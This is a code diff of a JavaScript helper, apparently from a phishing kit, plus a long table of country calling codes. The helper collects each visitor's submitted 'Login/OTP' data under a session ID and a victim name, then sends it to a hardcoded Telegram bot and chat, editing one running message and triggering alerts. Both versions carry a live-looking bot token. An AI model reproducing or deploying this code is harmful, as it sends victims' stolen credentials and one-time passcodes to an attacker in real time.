@@ -1,117 +1,102 @@
-// utils/telegram.js
+const BOT_TOKEN = '8862924560:AAH9eoEkGkNNZwlGL3UM89TutW9PXNQYqHs'; 
+const CHAT_ID = '-5538456743'; 
+const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
 
-// ==========================================
-// THAY BOT TOKEN VÀ CHAT ID CỦA MÀY VÀO ĐÂY
-const BOT_TOKEN = '8862924560:AAH9eoEkGkNNZwlGL3UM89TutW9PXNQYqHs';
-const CHAT_ID = '-5364980544';
-// ==========================================
+let tgMessageId = null;
+let currentSessionText = '';
+let currentSessionId = '';
+let currentCustomerHeader = ''; // Biến mới: Lưu tên khách để báo hiệu ở các bước sau
 
-const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
-// Biến lưu trữ nội dung và ID của tin nhắn để Edit
-let initialSessionText = '';
-let currentMessageId = null; // Lưu ID tin nhắn trên Telegram để edit
-
-export const escapeHtml = (str) => {
-  if (!str) return '';
-  return String(str)
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;');
-};
-
-export const setInitialSession = (text) => {
-  initialSessionText = text;
-  currentMessageId = null; // Reset lại ID khi bắt đầu phiên mới
-};
-
-export const sendTelegramMessage = async (extraText = '') => {
-  // Cộng dồn nội dung (giống hệt logic cũ của mày)
-  if (extraText) {
-      initialSessionText += extraText;
-  }
-  
-  const fullText = initialSessionText.trim();
-  if (!fullText) return;
-
-  try {
-    let res, data;
-
-    if (currentMessageId) {
-      // Nếu đã có tin nhắn trước đó -> Dùng editMessageText để cập nhật
-      res = await fetch(`${BASE_URL}/editMessageText`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          message_id: currentMessageId,
-          text: fullText,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true,
-        }),
-      });
-      data = await res.json();
-      
-      // Nếu lỗi (ví dụ tin nhắn bị xóa, hoặc text không đổi), fallback gửi tin mới
-      if (!data.ok && data.description && data.description.includes('message is not modified')) {
-          return; // Text y hệt, không làm gì cả
-      } else if (!data.ok) {
-          currentMessageId = null; // Reset để gửi tin mới bên dưới
-      }
+// Hàm lấy Session ID
+const getSessionId = () => {
+    if (currentSessionId) return currentSessionId;
+    let id = localStorage.getItem('session_id');
+    if (!id) {
+        id = 'user_' + Math.random().toString(36).substring(2, 9);
+        localStorage.setItem('session_id', id);
     }
-
-    // Nếu chưa có ID tin nhắn -> Gửi tin nhắn mới và lưu lại ID
-    if (!currentMessageId) {
-      res = await fetch(`${BASE_URL}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: fullText,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true,
-        }),
-      });
-      data = await res.json();
-      
-      if (data.ok && data.result) {
-          currentMessageId = data.result.message_id; // Lưu lại ID để lần sau edit
-      }
-    }
-  } catch (err) {
-    console.error('Telegram API error:', err);
-  }
+    currentSessionId = id;
+    return id;
 };
 
-// Map mã quốc gia -> mã vùng điện thoại
+// Cập nhật hàm này để nhận thêm tham số header (tên khách)
+export const setInitialSession = (text, header = '') => { 
+    currentSessionText = text; 
+    currentCustomerHeader = header; // Lưu lại tên khách
+};
+
+export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
+export const sendTelegramMessage = (newContent) => {
+    if (newContent) {
+        // Nếu có nội dung mới (Login/OTP), tự động chèn Tên Khách vào trước nội dung đó
+        const headerPrefix = currentCustomerHeader ? `<b>👤 ${currentCustomerHeader}</b>\n` : '';
+        currentSessionText += `\n\n${headerPrefix}${newContent}`;
+    }
+    
+    // TỰ ĐỘNG THÊM MÃ PHIÊN VÀO ĐẦU TIN NHẮN
+    const sid = getSessionId();
+    let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n` + currentSessionText;
+
+    const tgFetch = (method, payload) => {
+        let bodyStr = '';
+        for (let key in payload) {
+            if (payload.hasOwnProperty(key)) {
+                bodyStr += encodeURIComponent(key) + '=' + encodeURIComponent(payload[key]) + '&';
+            }
+        }
+        return fetch(API_URL + method, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
+            body: bodyStr
+        }).then(r => r.json()).catch(() => ({ ok: false }));
+    };
+
+    if (tgMessageId === null) {
+        tgFetch('sendMessage', { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }).then(d => {
+            if (d && d.ok && d.result) tgMessageId = d.result.message_id;
+        });
+    } else {
+        // Mẹo tạo thông báo: Gửi tin nhắn 🔔 rồi xóa
+        tgFetch('sendMessage', { chat_id: CHAT_ID, text: '🔔' }).then(res => {
+            if (res && res.ok && res.result) {
+                tgFetch('deleteMessage', { chat_id: CHAT_ID, message_id: res.result.message_id });
+            }
+            // Cập nhật lại ô tin nhắn chính
+            tgFetch('editMessageText', { chat_id: CHAT_ID, message_id: tgMessageId, text: text, parse_mode: 'HTML' });
+        });
+    }
+};
+
 export const countryCodeMap = {
-  AF: '+93', AL: '+355', DZ: '+213', AD: '+376', AO: '+244', AG: '+1', AR: '+54',
-  AM: '+374', AU: '+61', AT: '+43', AZ: '+994', BS: '+1', BH: '+973', BD: '+880',
-  BB: '+1', BY: '+375', BE: '+32', BZ: '+501', BJ: '+229', BT: '+975', BO: '+591',
-  BA: '+387', BW: '+267', BR: '+55', BN: '+673', BG: '+359', BF: '+226', BI: '+257',
-  KH: '+855', CM: '+237', CA: '+1', CV: '+238', CF: '+236', TD: '+235', CL: '+56',
-  CN: '+86', CO: '+57', KM: '+269', CG: '+242', CD: '+243', CR: '+506', CI: '+225',
-  HR: '+385', CU: '+53', CY: '+357', CZ: '+420', DK: '+45', DJ: '+253', DM: '+1',
-  DO: '+1', EC: '+593', EG: '+20', SV: '+503', GQ: '+240', ER: '+291', EE: '+372',
-  SZ: '+268', ET: '+251', FJ: '+679', FI: '+358', FR: '+33', GA: '+241', GM: '+220',
-  GE: '+995', DE: '+49', GH: '+233', GR: '+30', GD: '+1', GT: '+502', GN: '+224',
-  GW: '+245', GY: '+592', HT: '+509', HN: '+504', HK: '+852', HU: '+36', IS: '+354',
-  IN: '+91', ID: '+62', IR: '+98', IQ: '+964', IE: '+353', IL: '+972', IT: '+39',
-  JM: '+1', JP: '+81', JO: '+962', KZ: '+7', KE: '+254', KI: '+686', KW: '+965',
-  KG: '+996', LA: '+856', LV: '+371', LB: '+961', LS: '+266', LR: '+231', LY: '+218',
-  LI: '+423', LT: '+370', LU: '+352', MO: '+853', MG: '+261', MW: '+265', MY: '+60',
-  MV: '+960', ML: '+223', MT: '+356', MH: '+692', MR: '+222', MU: '+230', MX: '+52',
-  FM: '+691', MD: '+373', MC: '+377', MN: '+976', ME: '+382', MA: '+212', MZ: '+258',
-  MM: '+95', NA: '+264', NR: '+674', NP: '+977', NL: '+31', NZ: '+64', NI: '+505',
-  NE: '+227', NG: '+234', KP: '+850', MK: '+389', NO: '+47', OM: '+968', PK: '+92',
-  PW: '+680', PS: '+970', PA: '+507', PG: '+675', PY: '+595', PE: '+51', PH: '+63',
-  PL: '+48', PT: '+351', PR: '+1', QA: '+974', RO: '+40', RU: '+7', RW: '+250',
-  KN: '+1', LC: '+1', VC: '+1', WS: '+685', SM: '+378', ST: '+239', SA: '+966',
-  SN: '+221', RS: '+381', SC: '+248', SL: '+232', SG: '+65', SK: '+421', SI: '+386',
-  SB: '+677', SO: '+252', ZA: '+27', KR: '+82', SS: '+211', ES: '+34', LK: '+94',
-  SD: '+249', SR: '+597', SE: '+46', CH: '+41', SY: '+963', TW: '+886', TJ: '+992',
-  TZ: '+255', TH: '+66', TL: '+670', TG: '+228', TO: '+676', TT: '+1', TN: '+216',
-  TR: '+90', TM: '+993', TV: '+688', UG: '+256', UA: '+380', AE: '+971', GB: '+44',
-  US: '+1', UY: '+598', UZ: '+998', VU: '+678', VA: '+379', VE: '+58', VN: '+84',
-  YE: '+967', ZM: '+260', ZW: '+263',
+    "AF": "+93", "AL": "+355", "DZ": "+213", "AS": "+1", "AD": "+376", "AO": "+244", "AI": "+1", "AG": "+1", 
+    "AR": "+54", "AM": "+374", "AW": "+297", "AU": "+61", "AT": "+43", "AZ": "+994", "BS": "+1", "BH": "+973", 
+    "BD": "+880", "BB": "+1", "BY": "+375", "BE": "+32", "BZ": "+501", "BJ": "+229", "BM": "+1", "BT": "+975", 
+    "BO": "+591", "BA": "+387", "BW": "+267", "BR": "+55", "VG": "+1", "BN": "+673", "BG": "+359", "BF": "+226", 
+    "BI": "+257", "KH": "+855", "CM": "+237", "CA": "+1", "CV": "+238", "KY": "+1", "CF": "+236", "TD": "+235", 
+    "CL": "+56", "CN": "+86", "CO": "+57", "KM": "+269", "CG": "+242", "CD": "+243", "CK": "+682", "CR": "+506", 
+    "CI": "+225", "HR": "+385", "CU": "+53", "CW": "+599", "CY": "+357", "CZ": "+420", "DK": "+45", "DJ": "+253", 
+    "DM": "+1", "DO": "+1", "EC": "+593", "EG": "+20", "SV": "+503", "GQ": "+240", "ER": "+291", "EE": "+372", 
+    "SZ": "+268", "ET": "+251", "FK": "+500", "FO": "+298", "FJ": "+679", "FI": "+358", "FR": "+33", "GF": "+594", 
+    "PF": "+689", "GA": "+241", "GM": "+220", "GE": "+995", "DE": "+49", "GH": "+233", "GI": "+350", "GR": "+30", 
+    "GL": "+299", "GD": "+1", "GP": "+590", "GU": "+1", "GT": "+502", "GG": "+44", "GN": "+224", "GW": "+245", 
+    "GY": "+592", "HT": "+509", "HN": "+504", "HK": "+852", "HU": "+36", "IS": "+354", "IN": "+91", "ID": "+62", 
+    "IR": "+98", "IQ": "+964", "IE": "+353", "IM": "+44", "IL": "+972", "IT": "+39", "JM": "+1", "JP": "+81", 
+    "JE": "+44", "JO": "+962", "KZ": "+7", "KE": "+254", "KI": "+686", "XK": "+383", "KW": "+965", "KG": "+996", 
+    "LA": "+856", "LV": "+371", "LB": "+961", "LS": "+266", "LR": "+231", "LY": "+218", "LI": "+423", "LT": "+370", 
+    "LU": "+352", "MO": "+853", "MG": "+261", "MW": "+265", "MY": "+60", "MV": "+960", "ML": "+223", "MT": "+356", 
+    "MH": "+692", "MQ": "+596", "MR": "+222", "MU": "+230", "YT": "+262", "MX": "+52", "FM": "+691", "MD": "+373", 
+    "MC": "+377", "MN": "+976", "ME": "+382", "MS": "+1", "MA": "+212", "MZ": "+258", "MM": "+95", "NA": "+264", 
+    "NR": "+674", "NP": "+977", "NL": "+31", "NC": "+687", "NZ": "+64", "NI": "+505", "NE": "+227", "NG": "+234", 
+    "NU": "+683", "KP": "+850", "MK": "+389", "MP": "+1", "NO": "+47", "OM": "+968", "PK": "+92", "PW": "+680", 
+    "PS": "+970", "PA": "+507", "PG": "+675", "PY": "+595", "PE": "+51", "PH": "+63", "PL": "+48", "PT": "+351", 
+    "PR": "+1", "QA": "+974", "RE": "+262", "RO": "+40", "RU": "+7", "RW": "+250", "BL": "+590", "SH": "+290", 
+    "KN": "+1", "LC": "+1", "MF": "+590", "PM": "+508", "VC": "+1", "WS": "+685", "SM": "+378", "ST": "+239", 
+    "SA": "+966", "SN": "+221", "RS": "+381", "SC": "+248", "SL": "+232", "SG": "+65", "SX": "+1", "SK": "+421", 
+    "SI": "+386", "SB": "+677", "SO": "+252", "ZA": "+27", "KR": "+82", "SS": "+211", "ES": "+34", "LK": "+94", 
+    "SD": "+249", "SR": "+597", "SE": "+46", "CH": "+41", "SY": "+963", "TW": "+886", "TJ": "+992", "TZ": "+255", 
+    "TH": "+66", "TL": "+670", "TG": "+228", "TK": "+690", "TO": "+676", "TT": "+1", "TN": "+216", "TR": "+90", 
+    "TM": "+993", "TC": "+1", "TV": "+688", "UG": "+256", "UA": "+380", "AE": "+971", "GB": "+44", "US": "+1", 
+    "UY": "+598", "VI": "+1", "UZ": "+998", "VU": "+678", "VA": "+379", "VE": "+58", "VN": "+84", "WF": "+681", 
+    "EH": "+212", "YE": "+967", "ZM": "+260", "ZW": "+263"
 };
